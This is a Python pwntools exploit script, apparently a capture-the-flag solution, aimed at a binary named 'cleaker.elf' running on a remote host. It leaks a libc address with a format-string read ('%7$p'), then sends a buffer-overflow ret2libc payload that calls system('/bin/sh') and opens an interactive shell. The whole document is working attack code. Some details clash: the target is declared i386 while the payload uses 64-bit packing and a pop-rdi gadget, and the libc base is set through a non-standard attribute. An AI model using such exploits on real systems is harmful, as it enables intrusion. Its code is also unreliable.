#!/usr/bin/env python3
from pwn import *

context.update(arch = 'i386')
exe = './cleaker.elf'

libc = ELF('libc-2.31.so')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11674)

def local(argv = [], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv = [], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript = gdbscript)
    return io

def start(argv = [], *a, **kw):
    '''Start the exploit against the target'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

g_pop_rdi = 0x0000004011c0
offset = 0x000000087f65
ret = 0x000000401016

io = start()

io.recvuntil(b'Use printf power to find some libc function on stack: ')
io.sendline(b'%7$p')

leak = int(io.recvline(), 16)
libc.base = leak - offset

system = libc.base + libc.symbols['system']
shell = libc.base + next(libc.search(b'/bin/sh'))

payload  = b'A' * 128 + b'B' * 8
payload += p64(ret)
payload += p64(g_pop_rdi)
payload += p64(shell)
payload += p64(system)

io.recvuntil(b'Now use gets power to make your ret2libc: ')
io.sendline(payload)

io.interactive()